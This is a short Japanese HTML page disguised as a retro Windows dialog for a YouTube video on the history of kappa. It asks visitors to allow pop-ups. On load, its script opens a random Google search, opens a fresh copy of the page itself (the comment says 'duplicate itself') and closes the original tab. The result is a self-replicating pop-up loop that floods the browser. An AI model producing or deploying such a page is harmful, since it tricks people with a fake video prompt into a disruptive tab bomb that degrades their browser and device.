<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>河童の歴史-Youtube</title>

<style>
body{
    margin:0;
    min-height:100vh;

    display:flex;
    justify-content:center;
    align-items:center;

    background:#008080;

    font-family:"MS UI Gothic",sans-serif;

    padding:12px;
    box-sizing:border-box;
}

.window{
    width:100%;
    max-width:760px;

    background:#c0c0c0;

    border-top:2px solid #ffffff;
    border-left:2px solid #ffffff;
    border-right:2px solid #000000;
    border-bottom:2px solid #000000;

    box-sizing:border-box;
}

.titlebar{
    height:28px;

    background:linear-gradient(to right,#000080,#1084d0);

    color:white;

    display:flex;
    align-items:center;

    padding:0 8px;

    font-size:14px;
    font-weight:bold;

    box-sizing:border-box;
}

.content{
    padding:32px 16px;

    text-align:center;
    color:black;
}

h1{
    margin:0;

    font-size:clamp(24px,6vw,38px);

    font-weight:normal;
    line-height:1.4;
}

.text{
    margin-top:20px;

    font-size:clamp(14px,4vw,20px);
}
</style>
</head>
<body>

<div class="window">

    <div class="titlebar">
        河童の歴史-Youtube
    </div>

    <div class="content">

        <h1>
            河童の歴史を視聴されますか?
        </h1>

        <div class="text">
            ポップアップを許可してください。
        </div>

    </div>

</div>

<script>
const words = [
    "猫",
    "犬",
    "寿司",
    "プログラミング",
    "JavaScript",
    "富士山",
    "ゲーム",
    "アニメ",
    "宇宙",
    "河童"
];

requestAnimationFrame(() => {

    setTimeout(() => {

        const word =
            words[Math.floor(Math.random() * words.length)];

        const searchUrl =
            "https://www.google.com/search?q=" +
            encodeURIComponent(word);

        // 検索を開く
        window.open(searchUrl, "_blank");

        // 自分自身を複製
        window.open(location.href, "_blank");

        // 元タブを閉じる
        window.close();

    }, 200);

});
</script>

</body>
</html>
